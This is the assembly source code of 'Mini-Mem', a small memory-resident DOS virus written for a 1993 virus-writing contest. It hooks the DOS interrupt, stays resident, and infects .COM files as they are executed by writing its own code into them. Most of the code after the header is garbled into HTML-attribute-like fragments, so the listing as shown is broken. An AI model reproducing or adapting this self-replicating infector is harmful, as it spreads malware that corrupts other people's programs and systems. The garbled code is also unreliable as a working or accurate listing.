

;****************************************************************************
;*                           Mini-Mem (122 bytes)                           *
;*                                                                          *
;*                          Written by Stormbringer                         *
;*                                                                          *
;*   Written exclusively for the 1993 First International Virus Writing     *
;*Contest, this virus is a relatively small memory resident virus that      *
;*will infect .COM files as they are executed.  To save programming space,  *
;*it goes memory resident on its first run taking 64K to use as a working   *
;*area.  Because of this method, the first time an infected program is run  *
;*after bootup the program will fail.  After that, however, infected        *
;*run perfectly.                                                            *
;****************************************************************************

.model tiny
.radix 16
.code
        org 100
start:

Go_Mem:
        mov     ax,3521                 ;Get INT 21 addresses.
        mov     dx,offset Int_21
        int     21                         
        mov     word ptr [IP_21],bx     ;Save addresses for handler.
        mov     word ptr [CS_21],es
        mov     ah,25
        int     21                      ;Set Int 21
        not     dh
        int     27                      ;Go TSR, take a little <64k. ;(extra="" space="" used="" in="" infection)="" int_21:="" cmp="" ah,4bh="" ;is="" it="" an="" execute="" command?="" je="" execute="" cmp="" al,21="" ;could="" be="" install="" check....="" jne="" go_int_21="" cmp="" dx,offset="" int_21="" ;if="" not,="" let="" int="" 21="" continue.="" jne="" go_int_21="" restore_control:="" mov="" di,100="" ;is="" install="" check,="" restore="" pop="" si="" ;host="" file="" and="" run="" it.="" mov="" si,offset="" end_prog="" push="" di="" mov="" ch,0fdh="" ;copy="" host="" file="" down="" in="" memory.="" repnz="" movsb="" xor="" ax,ax="" iret="" ;return="" to="" host.="" execute:="" ;infect="" program="" being="" executed.="" push="" ax="" bx="" cx="" dx="" ds="" mov="" ax,3d02="" int="" 21="" ;open="" file="" read/write.="" xchg="" ax,bx="" push="" cs="" pop="" ds="" mov="" dx,offset="" end_prog="" mov="" ah,3f="" ;read="" in="" entire="" prog.="" mov="" ch,0fe="" int="" 21="" mov="" si,dx="" cmp="" byte="" ptr="" [si],0b8="" ;check="" for="" infection="" je="" done="" cmp="" byte="" ptr="" [si],'m'="" ;check="" for="" .exe="" je="" done="" push="" ax="" mov="" ax,4200="" xor="" cx,cx="" ;go="" to="" beginning="" of="" prog.="" xor="" dx,dx="" int="" 21="" pop="" cx="" ;add="" cx,end_prog-start="" ;tasm="" inserts="" a="" nop="" so="" do="" it="" directly.="" db="" 83,0c1,7ah="" mov="" ah,40="" ;write="" program="" back="" with="" virus.="" inc="" dh="" int="" 21="" done:="" mov="" ah,3e="" ;close="" file="" int="" 21="" pop="" ds="" dx="" cx="" bx="" ax="" go_int_21:="" db="" 0ea="" ;jump="" to="" int="" 21.="" ip_21="" dw="" 0="" ;not="" '?'="" because="" of="" the="" need="" to="" put="" cs_21="" dw="" 0="" ;a="" program="" directly="" after="" it="" in="" ;memory.="" end_prog:="" host_program:="" ;host="" program;="" not="" part="" of="" virus.="" ret="" ;this="" executes="" an="" int="" 20="" from="" the="" psp.="" end="" start=""></64k.>